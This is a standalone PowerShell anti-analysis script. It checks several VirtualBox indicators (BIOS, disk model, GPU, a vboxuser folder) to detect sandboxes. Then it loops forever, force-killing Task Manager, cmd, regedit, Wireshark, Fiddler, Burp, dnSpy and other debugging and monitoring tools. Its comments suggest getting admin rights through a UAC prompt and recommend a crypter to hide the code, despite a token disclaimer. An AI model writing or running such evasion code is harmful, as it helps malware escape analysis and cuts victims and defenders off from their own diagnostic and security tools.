class AntiDebug {
    [string]$systemModel
    [string]$biosVersion
    [string]$gpuInfo
    [bool]$isVirtual
    [bool]$isVirtualBios
    [bool]$isVirtualGPU
    [bool]$isVirtualDisk
    [object]$pcc
    [string]$diskModel
    [string]$UF

    AntiDebug() {
        $this.systemModel = (Get-WmiObject Win32_ComputerSystem).Model
        $this.biosVersion = (Get-WmiObject Win32_BIOS).Version
        $this.gpuInfo = (wmic path win32_videocontroller get caption).Trim()
        $this.pcc = Get-WmiObject Win32_PortConnector
        $this.diskModel = (wmic diskdrive get model).Trim()
        $this.UF = "C:\Users\vboxuser"

        $this.isVirtual = $this.systemModel -like '*Virtual*' -or $this.systemModel -like '*VirtualBox*'
        $this.isVirtualBios = $this.biosVersion -like '*VBOX*'
        $this.isVirtualGPU = $this.gpuInfo -match "Not Found" -or $this.gpuInfo -match "ERROR"
        $this.isVirtualDisk = $this.diskModel -like '*VBOX HARDDISK*' -or $this.diskModel -like '*VBOX*'
    }

    [void]Check() {
        if ($this.isVirtual) {
            Write-Host "[-] This system appears to be a virtual machine." -ForegroundColor Yellow
        }
        else {
            Write-Host "[+] Passed System Model Check" -ForegroundColor Green
        }

        if ($this.isVirtualBios) {
            Write-Host "[-] The BIOS version indicates this may be a VirtualBox virtual machine. Please check your environment." -ForegroundColor Yellow
        }
        else {
            Write-Host "[+] Passed BIOS Version Check" -ForegroundColor Green
        }

        if ($this.isVirtualGPU) {
            Write-Host "[-] GPU information not available or an error occurred." -ForegroundColor Red
        }
        else {
            Write-Host "[+] Passed GPU Check" -ForegroundColor Green
        }

        if ($this.pcc) {
            Write-Host "[+] Passed PortConnector Check" -ForegroundColor Green
        }
        else {
            Write-Host "[-] Please Don't run this program in a virtual environment" -ForegroundColor Red
        }

        if (Test-Path "C:\vboxpostinstall.log") {
            Write-Host "[+] Found vboxpostinstall.log in C:\" -ForegroundColor Yellow
        }

        if (Test-Path $this.UF) {
            Write-Host "[-] Found vboxuser folder in $($this.UF)" -ForegroundColor Yellow
        }
        else {
            Write-Host "[+] Passed User Test" -ForegroundColor Green
        }

        if ($this.isVirtualDisk) {
            Write-Host "[-] The disk drive model indicates this may be a VirtualBox virtual machine." -ForegroundColor Yellow
        }
        else {
            Write-Host "[+] Passed Disk Drive Model Check" -ForegroundColor Green
        }

        $this.antidebugproccess()
        Read-Host "Press Enter to exit"
    }

    [void] antidebugproccess() {
        $2kill = @('cmd', 'taskmgr', 'process', 'processhacker', 'ksdumper', 'fiddler', 'httpdebuggerui', 'wireshark', 'httpanalyzerv7', 'fiddler', 'decoder', 'regedit', 'procexp', 'dnspy', 'vboxservice', 'burpsuit', 'DbgX.Shell', 'ILSpy')
        # Loop btw 
        # i would like to mention trying kill taskmanger wont work until UAC Permissions (ADMIN), you can make uac prompt, and if person choses no then make it dont run
        # dont use for malicious purpoeses. if you do use crypter like from Chainski on github (AES ENCODER).
        while ($true) {
            foreach ($prg in $2kill) {
                $rprc = Get-Process -Name $prg -ErrorAction SilentlyContinue
                if ($rprc) {
                    Stop-Process -Name $prg -Force 
                    Write-Host "[+] Closed process: $prg" -ForegroundColor Yellow
                }
            }
            Start-Sleep -Seconds 2
        }
    }
}

$antiDebug = [AntiDebug]::new()
$antiDebug.Check()
